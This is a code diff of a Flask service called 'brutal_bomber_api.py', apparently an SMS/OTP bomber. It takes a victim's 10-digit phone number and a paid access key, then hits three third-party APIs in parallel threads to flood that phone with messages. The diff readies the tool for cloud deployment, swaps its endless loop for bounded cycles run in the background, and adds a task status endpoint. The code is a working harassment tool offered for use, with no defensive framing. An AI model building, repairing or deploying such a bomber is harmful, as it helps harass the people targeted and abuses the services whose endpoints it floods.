@@ -1,16 +1,32 @@
 # ============================================
 # brutal_bomber_api.py
+# FIXED FOR PYTHON 3.11+ — Render Deploy Ready
 # 3 APIs (Ultra + Part1 + Part2) + Key System
-# Fixed for Render — Python 3.10 compatible
 # ============================================
 
-from flask import Flask, request, jsonify
-import requests
+import os
+import sys
 import time
 import secrets
+import threading
+import importlib
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Lock
+
+# ====== FIX: pkgutil.get_loader REPLACEMENT ======
+def get_flask_app():
+    """Fix for Python 3.11+ — avoids pkgutil.get_loader"""
+    try:
+        from flask import Flask, request, jsonify
+        return Flask, request, jsonify
+    except ImportError:
+        # Fallback for older Python
+        import flask
+        return flask.Flask, flask.request, flask.jsonify
+
+Flask, request, jsonify = get_flask_app()
+
+import requests
 
 app = Flask(__name__)
 
@@ -70,138 +86,125 @@ THREE_APIS = [
     }
 ]
 
-# ====== BOMBER ENGINE ======
-class BrutalBomber:
-    def __init__(self, number, threads=50, delay=0.005):
-        self.number = number
-        self.threads = threads
-        self.delay = delay
-        self.success = 0
-        self.failed = 0
-        self.running = True
-        self.start_time = time.time()
-        self.session = requests.Session()
+# ====== FIXED BOMBER ENGINE (NO INFINITE LOOP) ======
+def send_request(api, phone, delay=0.005):
+    """Single request — no infinite loop"""
+    time.sleep(delay)
+    try:
+        params = api["params"].copy()
+        for k, v in params.items():
+            if "{num}" in v:
+                params[k] = v.replace("{num}", phone)
+        resp = requests.get(api["url"], params=params, timeout=10)
+        return resp.status_code == 200
+    except:
+        return False
+
+def run_bombing(phone, key, cycles=3, threads=50, delay=0.005):
+    """Run bombing for limited cycles — no infinite loop"""
+    if not validate_key(key):
+        return {"status": "error", "message": "Invalid key"}
     
-    def _send(self, api):
-        if not self.running:
-            return False
-        time.sleep(self.delay)
-        try:
-            params = api["params"].copy()
-            for k, v in params.items():
-                if isinstance(v, str) and "{num}" in v:
-                    params[k] = v.replace("{num}", self.number)
-            resp = self.session.get(api["url"], params=params, timeout=10)
-            if resp.status_code == 200:
-                self.success += 1
-                return True
-            self.failed += 1
-            return False
-        except:
-            self.failed += 1
-            return False
+    success = 0
+    failed = 0
     
-    def start(self):
-        self.running = True
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            while self.running:
-                futures = [executor.submit(self._send, api) for api in THREE_APIS]
-                for future in as_completed(futures):
-                    if not self.running:
-                        break
-                    future.result()
-                elapsed = int(time.time() - self.start_time)
-                rate = self.success / elapsed if elapsed > 0 else 0
-                print(f"✅ {self.success} | ❌ {self.failed} | ⚡ {rate:.1f}/s")
+    for cycle in range(cycles):
+        # Create list of APIs (multiply for more requests)
+        api_list = THREE_APIS * 2  # 6 requests per cycle
         
-        return {
-            "target": self.number,
-            "successful": self.success,
-            "failed": self.failed,
-            "total_apis": len(THREE_APIS)
-        }
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(send_request, api, phone, delay) for api in api_list]
+            for future in as_completed(futures):
+                if future.result():
+                    success += 1
+                else:
+                    failed += 1
+        
+        # Small delay between cycles
+        if cycle < cycles - 1:
+            time.sleep(1)
     
-    def stop(self):
-        self.running = False
+    return {
+        "status": "success",
+        "phone": phone,
+        "cycles": cycles,
+        "successful": success,
+        "failed": failed,
+        "total": success + failed,
+        "total_apis": len(THREE_APIS)
+    }
 
-active_bombers = {}
+# ====== BACKGROUND TASK STORAGE ======
+tasks = {}
 
-# ====== API ENDPOINTS ======
+# ====== FIXED API ENDPOINTS ======
 
 @app.route('/')
 def home():
     return {
         "status": "🔥 BRUTAL BOMBER API 🔥",
-        "version": "2.0",
+        "version": "3.0",
+        "python_version": sys.version,
         "apis": [api["name"] for api in THREE_APIS],
         "endpoints": {
-            "/bomb": "GET/POST — phone, key, threads, delay",
-            "/keygen": "POST — Generate new API key (admin key required)",
-            "/key/expire": "POST — Expire a key (admin key required)",
-            "/keys": "POST — List all keys (admin key required)",
-            "/health": "GET — Health check",
-            "/stop": "GET — Stop bombing"
+            "/bomb": "GET/POST — phone, key, cycles, threads, delay",
+            "/keygen": "POST — Generate new API key",
+            "/key/expire": "POST — Expire a key",
+            "/health": "GET — Health check"
         }
     }
 
 @app.route('/bomb', methods=['GET', 'POST'])
 def bomb():
+    """Bombing endpoint — returns immediately, runs in background"""
     if request.method == 'GET':
         phone = request.args.get('phone')
         key = request.args.get('key')
+        cycles = int(request.args.get('cycles', 3))
         threads = int(request.args.get('threads', 50))
         delay = float(request.args.get('delay', 0.005))
     else:
         data = request.get_json() or {}
         phone = data.get('phone')
         key = data.get('key')
+        cycles = data.get('cycles', 3)
         threads = data.get('threads', 50)
         delay = data.get('delay', 0.005)
     
+    # Validate
     if not key or not validate_key(key):
         return jsonify({"status": "error", "message": "Invalid or expired key"}), 401
     
     if not phone or len(phone) != 10 or not phone.isdigit():
         return jsonify({"status": "error", "message": "Phone number must be 10 digits"}), 400
     
-    bomber = BrutalBomber(phone, threads, delay)
-    bomber_id = f"{phone}_{int(time.time())}"
-    active_bombers[bomber_id] = bomber
+    # Create task ID
+    task_id = f"{phone}_{int(time.time())}"
     
-    import threading
-    def run_bomb():
-        result = bomber.start()
-        if bomber_id in active_bombers:
-            del active_bombers[bomber_id]
-        return result
+    # Run in background thread
+    def run_task():
+        result = run_bombing(phone, key, cycles, threads, delay)
+        tasks[task_id] = result
     
-    threading.Thread(target=run_bomb).start()
+    thread = threading.Thread(target=run_task)
+    thread.daemon = True
+    thread.start()
     
     return jsonify({
         "status": "success",
-        "message": "Bombing started",
-        "bomber_id": bomber_id,
+        "message": "Bombing started in background",
+        "task_id": task_id,
         "phone": phone,
+        "cycles": cycles,
         "apis": len(THREE_APIS)
     })
 
-@app.route('/stop', methods=['GET', 'POST'])
-def stop():
-    if request.method == 'GET':
-        bomber_id = request.args.get('bomber_id')
-    else:
-        data = request.get_json() or {}
-        bomber_id = data.get('bomber_id')
-    
-    if not bomber_id:
-        return jsonify({"status": "error", "message": "bomber_id required"}), 400
-    
-    if bomber_id in active_bombers:
-        active_bombers[bomber_id].stop()
-        del active_bombers[bomber_id]
-        return jsonify({"status": "success", "message": "Bombing stopped"})
-    
-    return jsonify({"status": "error", "message": "Bomber not found"}), 404
+@app.route('/status/<task_id>', methods=['GET'])
+def get_status(task_id):
+    """Check bombing status"""
+    if task_id in tasks:
+        return jsonify(tasks[task_id])
+    return jsonify({"status": "pending", "message": "Task not completed yet"})
 
 @app.route('/keygen', methods=['POST'])
 def keygen():
@@ -237,24 +240,12 @@ def expire():
     
     return jsonify({"status": "error", "message": "Key not found"}), 404
 
-@app.route('/keys', methods=['POST'])
-def list_keys():
-    data = request.get_json() or {}
-    admin_key = data.get('admin_key')
-    
-    if admin_key != DEFAULT_KEY:
-        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
-    
-    return jsonify({
-        "status": "success",
-        "keys": keys_db
-    })
-
 @app.route('/health')
 def health():
     return jsonify({
         "status": "healthy",
-        "version": "2.0",
+        "version": "3.0",
+        "python_version": sys.version.split()[0],
         "apis": len(THREE_APIS),
         "active_keys": len([k for k, v in keys_db.items() if v["active"]]),
         "total_keys": len(keys_db)
@@ -270,4 +261,5 @@ def stats():
     })
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
